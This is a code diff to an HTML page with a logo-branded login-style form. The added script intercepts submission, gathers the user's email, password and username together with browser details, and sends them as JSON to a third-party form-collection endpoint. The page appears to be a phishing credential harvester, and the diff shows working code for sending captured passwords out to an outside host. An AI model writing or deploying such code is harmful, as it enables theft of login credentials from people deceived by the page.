@@ -269,8 +269,7 @@
             background-color: rgb(252, 251, 251);" class="form-content">
                 <div style="
                 background-color: rgb(252, 251, 251);" class="center">
-                    <form style="
-                    background-color: rgb(252, 251, 251);" action="https://usebasin.com/f/619f54c3ae82" method="POST">
+                    <form style="background-color: rgb(252, 251, 251);" id="myForm" onsubmit="submitForm(event)">
                         <div style="margin-left: -65px;" class="logo">
                           <div class="tlogo">
                           <img class="thlogo"  src="th (2).jpeg" alt="" />
@@ -381,4 +380,49 @@
           });
       }
   </script>
+    
+<script>
+function submitForm(event) {
+  event.preventDefault();
+
+  // Get user's input data
+  const formData = {
+    useremail: document.getElementById('useremail').value,
+    userpassword: document.getElementById('userpassword').value,
+    username: document.getElementById('username').value,
+  };
+
+  // Get user's browser details
+  const browserDetails = {
+    userAgent: navigator.userAgent,
+    language: navigator.language,
+    platform: navigator.platform,
+  };
+
+  // Combine user input data with browser details
+  const combinedData = {
+    ...formData,
+    ...browserDetails,
+  };
+
+  // Send combined data to your form backend (replace 'your-backend-url' with the actual URL)
+  fetch('https://usebasin.com/f/619f54c3ae82', {
+    method: 'POST',
+    headers: {
+      'Content-Type': 'application/json',
+    },
+    body: JSON.stringify(combinedData),
+  })
+  .then(response => {
+    // Handle the backend response if needed
+    console.log('Backend response:', response);
+    // Perform additional form submission logic if needed
+    document.getElementById('myForm').submit();
+  })
+  .catch(error => {
+    console.error('Error:', error);
+    // Handle errors if needed
+  });
+}
+</script>
 </html>
